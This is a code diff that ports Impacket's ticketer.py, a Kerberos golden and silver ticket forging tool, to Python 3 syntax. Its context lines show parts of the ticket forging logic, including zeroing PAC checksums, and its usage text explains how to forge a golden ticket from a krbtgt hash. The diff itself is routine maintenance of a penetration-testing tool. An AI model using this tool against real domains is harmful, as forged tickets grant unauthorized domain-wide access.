@@ -40,6 +40,7 @@
 # [X] Silver tickets still not implemented - DONE by @machosec and fixes by @br4nsh
 # [ ] When -request is specified, we could ask for a user2user ticket and also populate the received PAC
 #
+from __future__ import print_function
 import argparse
 import datetime
 import logging
@@ -387,7 +388,7 @@ class TICKETER:
         encTicketPart['authorization-data'][0]['ad-data'] = noValue
 
         # Let's locate the KERB_VALIDATION_INFO and Checksums
-        if pacInfos.has_key(PAC_LOGON_INFO):
+        if PAC_LOGON_INFO in pacInfos:
             data = pacInfos[PAC_LOGON_INFO]
             validationInfo = VALIDATION_INFO()
             validationInfo.fromString(pacInfos[PAC_LOGON_INFO])
@@ -455,7 +456,7 @@ class TICKETER:
         logging.info('\tPAC_LOGON_INFO')
 
         # Let's now clear the checksums
-        if pacInfos.has_key(PAC_SERVER_CHECKSUM):
+        if PAC_SERVER_CHECKSUM in pacInfos:
             serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
             if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
                 serverChecksum['Signature'] = '\x00' * 12
@@ -467,7 +468,7 @@ class TICKETER:
         else:
             raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')
 
-        if pacInfos.has_key(PAC_PRIVSVR_CHECKSUM):
+        if PAC_PRIVSVR_CHECKSUM in pacInfos:
             privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
             privSvrChecksum['Signature'] = '\x00' * 12
             if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
@@ -480,7 +481,7 @@ class TICKETER:
         else:
             raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')
 
-        if pacInfos.has_key(PAC_CLIENT_INFO_TYPE):
+        if PAC_CLIENT_INFO_TYPE in pacInfos:
             pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])
             pacClientInfo['ClientId'] = unixTime
             pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()
@@ -623,7 +624,7 @@ class TICKETER:
 
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('Customized EncTicketPart')
-            print encTicketPart.prettyPrint()
+            print(encTicketPart.prettyPrint())
             print ('\n')
 
         encodedEncTicketPart = encoder.encode(encTicketPart)
@@ -666,7 +667,7 @@ class TICKETER:
 
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('Final Golden Ticket')
-            print kdcRep.prettyPrint()
+            print(kdcRep.prettyPrint())
             print ('\n')
 
         return encoder.encode(kdcRep), cipher, sessionKey
@@ -692,7 +693,7 @@ class TICKETER:
 if __name__ == '__main__':
     # Init the example's logger theme
     logger.init()
-    print version.BANNER
+    print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help=True, description="Creates a Kerberos golden/silver tickets based on "
                                                                 "user options")
@@ -727,18 +728,18 @@ if __name__ == '__main__':
 
     if len(sys.argv)==1:
         parser.print_help()
-        print "\nExamples: "
-        print "\t./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n"
-        print "\twill create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4."
-        print "\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256"
-        print "\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as"
-        print "\tbaduser.ccache.\n"
-        print "\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain " \
-              "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n"
-        print "\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used"
-        print "\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,"
-        print "\thence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser'"
-        print "\tand saved as baduser.ccache"
+        print("\nExamples: ")
+        print("\t./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n")
+        print("\twill create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.")
+        print("\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256")
+        print("\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as")
+        print("\tbaduser.ccache.\n")
+        print("\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain " \
+              "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n")
+        print("\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used")
+        print("\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,")
+        print("\thence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser'")
+        print("\tand saved as baduser.ccache")
         sys.exit(1)
 
     options = parser.parse_args()
@@ -773,7 +774,7 @@ if __name__ == '__main__':
     try:
         executer = TICKETER(options.target, password, options.domain, options)
         executer.run()
-    except Exception, e:
+    except Exception as e:
         #import traceback
         #print traceback.print_exc()
-        print str(e)
+        print(str(e))
